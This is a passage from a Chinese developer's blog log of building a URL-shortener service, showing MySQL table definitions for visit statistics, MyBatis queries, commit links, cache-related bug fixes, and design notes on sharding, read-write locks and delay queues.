class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_browser_stats` (`full_short_url`,`gid`,`<span class="type">date</span>`,`browser`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">8</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/50a6797ab4b9a344e9be4dc924783d13b3e90027">feature:统计浏览器 · 50a6797 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="创建访问日志表"><a href="#创建访问日志表" class="headerlink" title="创建访问日志表"></a>创建访问日志表</h3><p>可以达到统计高频访问IP、统计访客量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `t_link_access_logs` (</span><br><span class="line">  `id` bigint NOT NULL AUTO_INCREMENT COMMENT &#x27;ID&#x27;,</span><br><span class="line">  `full_short_url` varchar(128) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;完整短链接&#x27;,</span><br><span class="line">  `gid` varchar(32) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;分组标识&#x27;,</span><br><span class="line">  `user` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;用户信息&#x27;,</span><br><span class="line">  `browser` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;浏览器&#x27;,</span><br><span class="line">  `os` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;操作系统&#x27;,</span><br><span class="line">  `ip` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT &#x27;IP&#x27;,</span><br><span class="line">  `create_time` datetime DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `update_time` datetime DEFAULT NULL COMMENT &#x27;修改时间&#x27;,</span><br><span class="line">  `del_flag` tinyint(1) DEFAULT NULL COMMENT &#x27;删除标识 0：未删除 1：已删除&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<p>group 获取count 然后排序就行</p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/ba6839e606a8a160a22aa074930db78f91c32a34">feature:创建访问日志表 · ba6839e · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计访问设备"><a href="#统计访问设备" class="headerlink" title="统计访问设备"></a>统计访问设备</h3><p>对应数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_device_stats` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `cnt` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">  `device` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问设备&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_browser_stats` (`full_short_url`,`gid`,`<span class="type">date</span>`,`device`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/a90cad38844f6508de0b40e32ea0d84c3c2bb12f">feature:创建访问设备 · a90cad3 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计网络访问"><a href="#统计网络访问" class="headerlink" title="统计网络访问"></a>统计网络访问</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_network_stats` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `cnt` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问量&#x27;</span>,</span><br><span class="line">  `network` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问网络&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_browser_stats` (`full_short_url`,`gid`,`<span class="type">date</span>`,`network`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/a90cad38844f6508de0b40e32ea0d84c3c2bb12f">feature:创建访问设备 · a90cad3 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="访问单个短链接监控统计功能"><a href="#访问单个短链接监控统计功能" class="headerlink" title="访问单个短链接监控统计功能"></a>访问单个短链接监控统计功能</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/002416a5aeab392a624b8cf144a104376b387553">feature:统计网络访问 · 002416a · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>主要是数据库语句（<del>刷了lc sql题，还是好写</del>）</p>
<h3 id="记录短链接访问日志"><a href="#记录短链接访问日志" class="headerlink" title="记录短链接访问日志"></a>记录短链接访问日志</h3><p>对应数据库表修改语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_link_access_logs</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> `network` <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问网络&#x27;</span> AFTER `os`,</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> `device` <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问设备&#x27;</span> AFTER `network`,</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> `locale` <span class="type">VARCHAR</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;访问地区&#x27;</span> AFTER `device`;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_link_access_logs</span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> `ip` <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;IP&#x27;</span> AFTER `<span class="keyword">user</span>`;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/08cdda7a0de7bd872eb2cf351d9db30964778c45">feature:开发短链接监控相关用户访问明细 · 08cdda7 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="分页查询短链接访问日志"><a href="#分页查询短链接访问日志" class="headerlink" title="分页查询短链接访问日志"></a>分页查询短链接访问日志</h3><p><a href="https://blog.csdn.net/qq_45802080/article/details/124409852">mybatis-plus分页类型转换_mybatisplus convert-CSDN博客</a></p>
<p>关键sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="variable">@Select</span>(&quot;&lt;script&gt; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;SELECT &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    user, &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    CASE &quot; <span class="operator">+</span></span><br><span class="line">        &quot;        WHEN MIN(create_time) BETWEEN #&#123;startDate&#125; AND #&#123;endDate&#125; THEN &#x27;新访客&#x27; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;        ELSE &#x27;老访客&#x27; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    END AS uvType &quot; <span class="operator">+</span></span><br><span class="line">        &quot;FROM &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    t_link_access_logs &quot; <span class="operator">+</span></span><br><span class="line">        &quot;WHERE &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    full_short_url = #&#123;fullShortUrl&#125; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    AND gid = #&#123;gid&#125; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    AND user IN &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    &lt;foreach item=&#x27;item&#x27; index=&#x27;index&#x27; collection=&#x27;userAccessLogsList&#x27; open=&#x27;(&#x27; separator=&#x27;,&#x27; close=&#x27;)&#x27;&gt; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;        #&#123;item&#125; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    &lt;/foreach&gt; &quot; <span class="operator">+</span></span><br><span class="line">        &quot;GROUP BY &quot; <span class="operator">+</span></span><br><span class="line">        &quot;    user;&quot; <span class="operator">+</span></span><br><span class="line">        &quot;    &lt;/script&gt;&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>感觉foreach部分不太优雅，不如直接加一层转换来处理或者直接使用函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;(&quot; + StrUtil.join(userAccessLogsList, &quot;-&quot;)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/jack1liu/article/details/112427764">String.join()和StringUtils.join()优雅解决数组或者集合拼接_string.join和-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/CoreyXuu/article/details/112364454">IntelliJ IDEA 调试Java Stream流_idea stream流联想-CSDN博客</a></p>
<h3 id="分页查询短链接今日以及历史访问信息设计"><a href="#分页查询短链接今日以及历史访问信息设计" class="headerlink" title="分页查询短链接今日以及历史访问信息设计"></a>分页查询短链接今日以及历史访问信息设计</h3><p>创建表t_link_stats_today（也是需要分表）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_stats_today` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;短链接&#x27;</span>,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">  `today_pv` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;今日PV&#x27;</span>,</span><br><span class="line">  `today_uv` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;今日UV&#x27;</span>,</span><br><span class="line">  `today_uip` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;今日IP数&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_full<span class="operator">-</span>short<span class="operator">-</span>url` (`full_short_url`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">2</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;;</span><br></pre></td></tr></table></figure>

<p>然后t_link增加字段(从t_link_0到t_link_15)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_link_0 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> total_uv <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;历史uv&#x27;</span>, <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> total_pv <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;历史pv&#x27;</span>, <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> total_uip <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;历史uip&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/98ea6973c37b7e19a0b295bdbfa2661a85d6036c">feature:开发短链接分页监控相关功能 · 98ea697 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接汇总访问数据"><a href="#统计短链接汇总访问数据" class="headerlink" title="统计短链接汇总访问数据"></a>统计短链接汇总访问数据</h3><p>在restoreUrl 加了点逻辑</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/4bc22645a14e5afa120352853a593f3bd347b57a">feature:开发短链接监控之今日汇总 · 4bc2264 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接监控之今日数据访问"><a href="#统计短链接监控之今日数据访问" class="headerlink" title="统计短链接监控之今日数据访问"></a>统计短链接监控之今日数据访问</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/a6cfe22a52ec3662ec5f8adf2d74ac572ba11b25">feature:统计短链接监控之今日数据访问 · a6cfe22 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="分页查询短链接监控数据排序功能"><a href="#分页查询短链接监控数据排序功能" class="headerlink" title="分页查询短链接监控数据排序功能"></a>分页查询短链接监控数据排序功能</h3><p><a href="https://blog.csdn.net/yilulvxing/article/details/86595725">SQL——coalesce函数详解_sql coalesce-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/huo065000/article/details/122045758">ShardingSphere-JDBC＜绑定表＞避免JOIN 笛卡尔积_shardingsphere bindingtables-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/u014454538/article/details/108948235">数据库中的四大join &amp; 笛卡尔乘积（以MySQL为例）_join 笛卡尔积-CSDN博客</a></p>
<p><a href="https://shardingsphere.apache.org/document/current/cn/features/sharding/concept/">核心概念 :: ShardingSphere</a></p>
<p>修改了部分dao得属性名、增加了bindingTables、增加了orderTag字段</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/6e4e08d443e253be55454eb6ba042a1256c8adcf">feature:开发短链接监控之分页排序功能 · 6e4e08d · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计短链接监控之指定时间内PV、UV、UIP数据"><a href="#统计短链接监控之指定时间内PV、UV、UIP数据" class="headerlink" title="统计短链接监控之指定时间内PV、UV、UIP数据"></a>统计短链接监控之指定时间内PV、UV、UIP数据</h3><p>crud</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/d5fc466fa2f7768e5b576f0d7a911d45426e1a63">feature:统计短链接监控之指定时间内PV、UV、UIP数据 · d5fc466 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="统计分组短链接监控数据"><a href="#统计分组短链接监控数据" class="headerlink" title="统计分组短链接监控数据"></a>统计分组短链接监控数据</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/cfcdbc40531e634bcff4473d473c2f656530cb89">feature:统计分组短链接监控数据 · cfcdbc4 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/a782b7bc368e6c609ab05f6d79c227e41a54d4be">feature:统计分组短链接监控数据 · a782b7b · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="分页查询分组短链接访问日志"><a href="#分页查询分组短链接访问日志" class="headerlink" title="分页查询分组短链接访问日志"></a>分页查询分组短链接访问日志</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/fa41d9f642a50b41de59f96f697ae77ca756c212">feature:分页查询分组短链接访问日志 · fa41d9f · changchun&#x2F;shortlink - Gitee.com</a></p>
<h2 id="功能扩展"><a href="#功能扩展" class="headerlink" title="功能扩展"></a>功能扩展</h2><h3 id="短链接创建时指定默认域名"><a href="#短链接创建时指定默认域名" class="headerlink" title="短链接创建时指定默认域名"></a>短链接创建时指定默认域名</h3><p><a href="https://gitee.com/xiong-changchun/shortlink/commit/da7469002e1815e54a2844dabc3d93805aa7c276">feature:短链接创建时指定默认域名 · da74690 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>默认域名写在配置文件里面的</p>
<h3 id="通过接口批量创建短链接"><a href="#通过接口批量创建短链接" class="headerlink" title="通过接口批量创建短链接"></a>通过接口批量创建短链接</h3><p><a href="https://easyexcel.opensource.alibaba.com/docs/current/quickstart/write">写Excel | Easy Excel 官网</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/8edfdebc94e5b256cdbbd13bb26bfe76e1891234">feature:通过接口批量创建短链接 · 8edfdeb · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="修复短链接跳转空指针问题"><a href="#修复短链接跳转空指针问题" class="headerlink" title="修复短链接跳转空指针问题"></a>修复短链接跳转空指针问题</h3><p>情况：短链接创建永久的能正常访问，但是加入回收站，再拿出来就无法正常访问</p>
<p>出错代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (shortLinkDO == null || shortLinkDO.getValidDate().before(new Date())) &#123;</span><br></pre></td></tr></table></figure>

<p>原因分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getValidDate() 可能是为null产生空指针问题</span><br><span class="line"></span><br><span class="line">在之前得情况中，我们创建短链接得时候进行了缓存预热： stringRedisTemplate.opsForValue().set(</span><br><span class="line">                String.format(GOTO_SHORT_LINK_KEY, fullShortUrl),</span><br><span class="line">                requestParam.getOriginUrl(),</span><br><span class="line">                LinkUtil.getLinkCacheValidTime(requestParam.getValidDate()), TimeUnit.MILLISECONDS</span><br><span class="line">        );</span><br><span class="line">加入回收站将该key从缓存中删除了：stringRedisTemplate.delete(String.format(GOTO_SHORT_LINK_KEY, requestParam.getFullShortUrl()));</span><br><span class="line"></span><br><span class="line">所以会走到if (shortLinkDO == null || shortLinkDO.getValidDate().before(new Date())) &#123; 导致出现空指针异常</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/cca4a7715d3cc5d0b26e57b469e8f7b64d248aa5">fix:修复短链接跳转空指针问题 · cca4a77 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="修复短链接修改有限期后无法跳转问题"><a href="#修复短链接修改有限期后无法跳转问题" class="headerlink" title="修复短链接修改有限期后无法跳转问题"></a>修复短链接修改有限期后无法跳转问题</h3><p>系统从存在缓存得时候<strong>要对有哪些缓存有数</strong>，免得有的地方修改了数据但缓存还没有修改（一般修改了数据会删除对应缓存），导致不一致得情况</p>
<p><del>感觉黑马得redis质量还是高</del></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/d0d345b2ff335dd7d7726bae448f1a9b6c4f2a1f">fix:修复短链接修改无法访问问题 · d0d345b · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接变更分组记录功能"><a href="#短链接变更分组记录功能" class="headerlink" title="短链接变更分组记录功能"></a>短链接变更分组记录功能</h3><p>方法执行逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 删除原始短链接记录</span><br><span class="line">因为根据GID进行分表，可能不存在原始表中。</span><br><span class="line">解释：t_link表是更具gid进行分表的，若修改短链接的gid，则需要先删除原gid分表中的记录，再在新gid分表中插入修改后的短链接记录。</span><br><span class="line"></span><br><span class="line">2.索引按照目前创建的 full_short_url 字段可能存在冲突。（针对t_link表）</span><br><span class="line">UNIQUE INDEX `idx_unique_full_short_url`(`full_short_url` ASC) USING BTREE（之前的）</span><br><span class="line"></span><br><span class="line">需要创建一个新的字段存储删除时间戳 del_time，防止唯一索引冲突。</span><br><span class="line">不能使用del_flag 也能完成上述需求（第一次变更，如果路由到同一张表，会出现一个delFlag为0的记录，如果第二次变更，如果还是路由到同一张表，就会出现两个delFalag为0的记录，不符合唯一索引的设计）</span><br><span class="line">需要要单独创建个 del_time</span><br><span class="line"></span><br><span class="line">3.迁移相关业务表数据</span><br><span class="line">将短链接相关的表进行数据修改，如果涉及到分片行为，先删除原有数据再新增。如果不涉及分片行为，只需要修改对应的数据库表记录即可。</span><br><span class="line"></span><br><span class="line">引入读写锁</span><br><span class="line">	思考一个问题，如果短链接正在修改分组，这时有用户正在访问短链接，统计监控相关的分组还是之前的数据，是否就涉及到无法正确统计监控数据问题？</span><br><span class="line"></span><br><span class="line">引入分布式锁？不能。引入分布式锁，则同一时间仅允许一个用户访问，显然不现实。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	读写锁是一种用于管理对共享资源的访问的同步机制，允许多个线程同时读取共享资源，但在写入时保证独占访问，以确保数据的一致性和完整性。</span><br><span class="line">读写锁分为两类：</span><br><span class="line">    1. 读锁（共享锁）： 多个线程可以同时获取读锁，用于并发读取共享资源。读锁在没有写锁的情况下可以被多个线程持有。</span><br><span class="line">    2. 写锁（排它锁）： 写锁是独占的，一旦一个线程获取了写锁，其他线程无法同时获取读锁或写锁。写锁用于修改共享资源，确保在写入时没有其他线程能够访问。</span><br><span class="line">    读写锁的优势在于它允许多个线程同时读取共享资源，提高了读取的并发性，从而提升了性能。但是，在写入时必须独占资源，以确保数据的一致性。这种锁的使用场景适用于读操作频繁，写操作较少的情况。</span><br><span class="line">    </span><br><span class="line">5.引入延迟队列</span><br><span class="line">如果用户正在修改短链接分组，因为涉及到表操作很多，我们假设可能会操作 300ms。</span><br><span class="line">这 300ms 内难道就不允许用户访问？</span><br><span class="line"></span><br><span class="line">6.回收站删除</span><br><span class="line">因为加了 del_time，所以回收站删除功能也要改造</span><br><span class="line"></span><br><span class="line">7.修改短链接分组查询数量接口</span><br><span class="line">添加 del_flag 条件。</span><br></pre></td></tr></table></figure>

<p>引入了生产者消费者（使用redis实现，之后改为mq）</p>
<p><a href="https://blog.csdn.net/weixin_45433817/article/details/139073829">Redis第18讲——Redis和Redission实现延迟消息_redis延迟消息-CSDN博客</a></p>
<p>[延时队列方案选择及优缺点分析_redisson延时队列缺陷-CSDN博客](<a href="https://blog.csdn.net/justlpf/article/details/130404862#:~:text=%E9%A6%96%E5%85%88%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8">https://blog.csdn.net/justlpf/article/details/130404862#:~:text=首先推荐使用</a> RocketMQ、Pulsar 等拥有定时投递功能的消息队列。 在不方便获得专业消息队列时可以考虑使用 Redisson DelayQueue 等基于 Redis,崩溃等情况设计补偿保护机制。 在无法使用 Redisson DelayQueue 等方案时可以考虑使用时间轮。 由于时间轮重启远比 Redis 重启要频繁，定时扫库等保护机制更为重要。)</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/4fcd16f2cb03692b59679b7f9181a0ef4816c369">fix:短链接记录变更分组 · 4fcd16f · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接创建和修改验证跳转链接白名单"><a href="#短链接创建和修改验证跳转链接白名单" class="headerlink" title="短链接创建和修改验证跳转链接白名单"></a>短链接创建和修改验证跳转链接白名单</h3><p>风控相关：应该风控处理，不能跳转到非法链接（或者分析跳转网站，但太复杂了）</p>
<p>多个配置使用@ConfigurationProperties(prefix &#x3D; “short-link.goto-domain.white-list”)来接受</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/f3dc9c5243d7741da82f8594c1070c90c67f14f1">fix:短链接创建和修改验证跳转链接白名单 · f3dc9c5 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="变更用户已登录状态下异常行为"><a href="#变更用户已登录状态下异常行为" class="headerlink" title="变更用户已登录状态下异常行为"></a>变更用户已登录状态下异常行为</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/590647e21b0472ed7560c45550e23a48e3ba9212">refactor:运行用户重复登录、并修改token有效期为30分钟 · 590647e · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="用户创建分组限制最大数量"><a href="#用户创建分组限制最大数量" class="headerlink" title="用户创建分组限制最大数量"></a>用户创建分组限制最大数量</h3><p>需要使用分布式锁，防止同一用户在不同线程（可能同一用户在多个设备）同时新增分组，而超出最大分组数</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/74940a198332cbc7dcbbbec7082194b66846514c">optimization:用户创建分组限制最大数量 · 74940a1 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/02993df30ce173c06a054fcee2f93903834c8a47">fix:短链接验证布隆过滤器域名冲突修复 · 02993df · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="公网环境部署系统流量风控"><a href="#公网环境部署系统流量风控" class="headerlink" title="公网环境部署系统流量风控"></a>公网环境部署系统流量风控</h3><h4 id="短链接后管"><a href="#短链接后管" class="headerlink" title="短链接后管"></a>短链接后管</h4><p>根据登录用户做出控制，比如 x 秒请求后管系统的频率最多 x 次。</p>
